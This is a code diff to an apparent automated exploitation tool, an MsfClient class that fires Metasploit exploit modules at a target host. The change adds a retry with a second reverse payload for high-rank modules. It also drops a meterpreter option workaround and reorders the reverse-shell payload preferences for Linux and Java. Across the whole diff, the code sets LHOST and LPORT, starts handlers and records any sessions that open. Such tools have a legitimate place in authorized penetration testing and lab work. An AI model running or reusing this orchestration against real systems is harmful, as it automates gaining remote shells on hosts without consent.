@@ -710,34 +710,58 @@ class MsfClient:
         return data
 
     def fire(self, candidate, host, rhost, port, credential=None):
-        """Detonate the module against rhost with a single selected reverse payload.
-        Returns (session, status, detail). status is one of:
+        """Detonate the module against rhost. Returns (session, status, detail) with
+        the status vocabulary of _fire_once (session, no_session, blocked, error).
+        The best reverse payload is tried first (shells before meterpreter, per
+        _select_payloads). A Great or Excellent rank module that fires cleanly but
+        never calls back is retried once with the next compatible payload, since a
+        clean no_session on a high-rank exploit is usually a payload-reliability miss
+        rather than target resistance (the java_rmi_server shell-vs-meterpreter case).
+        Lower-rank and speculative candidates get a single attempt, so a dead host
+        does not double the fire phase. Each attempt owns its own LPORT and handler
+        job; the loop stops on the first non-no_session result."""
+        try:
+            modref = _strip_type(candidate.module)
+            exploit = self._client.modules.use("exploit", modref)
+            tgt_platform = self._align_target(exploit, candidate.module, host)
+            payloads = _select_payloads(exploit, candidate.module, host,
+                                        platform=tgt_platform)
+        except Exception as e:
+            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
+            return None, "error", f"fire error: {e}"
+        if not payloads:
+            return self._blocked(candidate, rhost, "no compatible payload")
+        # Second payload only for Great/Excellent (rank value >= 500); the loop below
+        # advances only on a clean no_session, so a blocked or error stops it at once.
+        cap = 2 if _rank_value(candidate.rank) >= 500 else 1
+        result = (None, "no_session", "fired, no session within timeout")
+        for payload_name in payloads[:cap]:
+            result = self._fire_once(exploit, candidate, host, rhost, port,
+                                     payload_name, credential)
+            if result[1] != "no_session":
+                break
+        return result
+
+    def _fire_once(self, exploit, candidate, host, rhost, port, payload_name,
+                   credential=None):
+        """One payload attempt against an already-prepared (used and target-aligned)
+        exploit module. Returns (session, status, detail). status is one of:
           session    - a session opened
           no_session - the module fired (execute was accepted) but nothing called
                        back within the timeout. This is the only clean negative.
           blocked    - no fair attempt was made: an option we needed was unset or
-                       rejected, no compatible payload, no derivable LHOST, the
-                       LPORT pool was empty, or MSF refused to run the module.
+                       rejected, no derivable LHOST, the LPORT pool was empty, or MSF
+                       refused to run the module.
           error      - an exception was raised during the attempt.
-        Only no_session means the target got a real attempt and did not yield;
-        every other non-session status flags a tooling gap to review, so a real
-        flaw is never buried under a generic failure. detail carries the reason.
-        One payload is tried per fire: the best pick from _select_payload, ordered
-        for reliability (interpreter and native shells first, meterpreter last).
-        The handler job is always stopped in teardown, which frees the LPORT and
-        leaves any session intact."""
+        Only no_session means the target got a real attempt and did not yield; every
+        other non-session status flags a tooling gap to review, so a real flaw is
+        never buried under a generic failure. This attempt owns its LPORT and handler
+        job, both freed in teardown, which leaves any session intact."""
         lport = self._lport_acquire()
         if lport is None:
             return self._blocked(candidate, rhost, "LPORT pool exhausted")
         job_id = None
         try:
-            modref = _strip_type(candidate.module)
-            exploit = self._client.modules.use("exploit", modref)
-            tgt_platform = self._align_target(exploit, candidate.module, host)
-            payload_name = _select_payload(exploit, candidate.module, host,
-                                           platform=tgt_platform)
-            if payload_name is None:
-                return self._blocked(candidate, rhost, "no compatible payload")
             payload = self._client.modules.use("payload", payload_name)
             lhost = self.cfg.lhost or _lhost_for(rhost)
             if not lhost:
@@ -769,14 +793,6 @@ class MsfClient:
                 fails += _apply_options(exploit, cred_sets)
             fails += _apply_options(payload, [("LHOST", lhost),
                                               ("LPORT", int(lport))])
-            # Meterpreter payloads carry AutoLoadExtensions as an advanced option
-            # whose default serializes as a list on some MSF builds; this msfrpcd
-            # rejects a list there ("must be a scalar") and the whole execute fails
-            # with no uuid / invalid option. Force it to a scalar when the payload
-            # declares it, so meterpreter payloads (java/meterpreter for java_rmi,
-            # the tomcat upload modules) are not dead on arrival. No-op for payloads
-            # that do not declare it (_apply_options skips undeclared keys).
-            _force_scalar_advanced(payload)
             # Required exploit options with no default that are still unset, minus
             # whatever the payload merge will supply. Anything outstanding is
             # module-specific (creds, a target URI with no default, and so on) we
@@ -839,7 +855,8 @@ class MsfClient:
                                           before=before_sids,
                                           module=candidate.module)
             if matched is None:
-                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
+                logger.info("fire %s @ %s -> no session (%s)", candidate.module,
+                            rhost, payload_name)
                 return None, "no_session", "fired, no session within timeout"
             sid, sdict = matched
             logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
@@ -884,9 +901,6 @@ class MsfClient:
                 fails += _apply_options(exploit, [("RPORT", int(port))])
             fails += _apply_options(payload, [("LHOST", lhost),
                                               ("LPORT", int(lport))])
-            # Same AutoLoadExtensions scalar workaround as fire(); retest fires the
-            # recorded payload, which may be a meterpreter one.
-            _force_scalar_advanced(payload)
             supplied = set(payload.runoptions)
             outstanding = [o for o in exploit.missing_required
                            if o not in supplied]
@@ -1364,18 +1378,14 @@ def _payload_prefs(platform, x64):
             "windows/shell_reverse_tcp",
         ]
     elif platform == "linux":
-        # Unstaged (shell_reverse_tcp) before staged (shell/reverse_tcp): one self-
-        # contained payload with no stager round-trip is more reliable on old targets
-        # and, critically, on upload-and-exec modules like mysql_udf_payload, where the
-        # staged variant's stager is what MSF rejects at execute (returns no uuid).
         if x64:
             prefs += [
-                "linux/x64/shell_reverse_tcp",
                 "linux/x64/shell/reverse_tcp",
+                "linux/x64/shell_reverse_tcp",
             ]
         prefs += [
-            "linux/x86/shell_reverse_tcp",
             "linux/x86/shell/reverse_tcp",
+            "linux/x86/shell_reverse_tcp",
         ]
     elif platform == "osx":
         prefs += [
@@ -1397,17 +1407,14 @@ def _payload_prefs(platform, x64):
             "cmd/unix/reverse_bash",
         ]
     elif platform == "java":
-        # java targets deliver a JVM payload, so the generic and native command
-        # shells below never produce a session here; the working java payloads must
-        # rank ahead of them. The shell-over-meterpreter preference is INVERTED for
-        # java on purpose: the staged java/shell/reverse_tcp fires but never calls
-        # back on old JVMs (Metasploitable2's java_rmi_server is the case), while
-        # java/meterpreter/reverse_tcp - what msf itself defaults to for these
-        # modules - reliably opens. Meterpreter first here, staged/jsp shells after
-        # as fallbacks.
-        prefs += ["java/meterpreter/reverse_tcp",
-                  "java/shell/reverse_tcp", "java/shell_reverse_tcp",
-                  "java/jsp_shell_reverse_tcp"]
+        # java targets deliver a JVM payload, so the generic and native
+        # command shells below never produce a session here; the working java
+        # payloads must rank ahead of them. Command shell first per the
+        # shell-over-meterpreter preference, with java meterpreter (what msf
+        # itself defaults to for these modules) as the java fallback.
+        prefs += ["java/shell/reverse_tcp", "java/shell_reverse_tcp",
+                  "java/jsp_shell_reverse_tcp",
+                  "java/meterpreter/reverse_tcp"]
     elif platform == "php":
         prefs += ["php/reverse_php"]
     elif platform == "python":
@@ -1496,23 +1503,6 @@ def _is_pass_opt(name):
     """Option name that takes a password (PASSWORD, SMBPass, HttpPassword, ...)."""
     n = name.lower()
     return n == "pass" or n.endswith("pass") or n.endswith("password")
-
-
-def _force_scalar_advanced(payload):
-    """Work around an msfrpcd/pymetasploit3 serialization mismatch: meterpreter
-    payloads expose AutoLoadExtensions as an advanced option whose default comes
-    across as a list, and some msfrpcd builds reject a list for it at execute
-    ("Invalid module option value for AutoLoadExtensions: must be a scalar"),
-    killing the whole fire with no uuid. Setting it to a single scalar string the
-    validator accepts clears the rejection. Only applied when the payload declares
-    the option, so it is a no-op for non-meterpreter payloads. Failures are
-    swallowed: this is a best-effort unblock, and a payload that will not take the
-    scalar still falls through to the normal execute path."""
-    try:
-        if "AutoLoadExtensions" in set(payload.options):
-            payload["AutoLoadExtensions"] = "stdapi"
-    except Exception as e:
-        logger.debug("could not force AutoLoadExtensions scalar: %s", e)
 
 
 def _apply_options(mod, pairs):
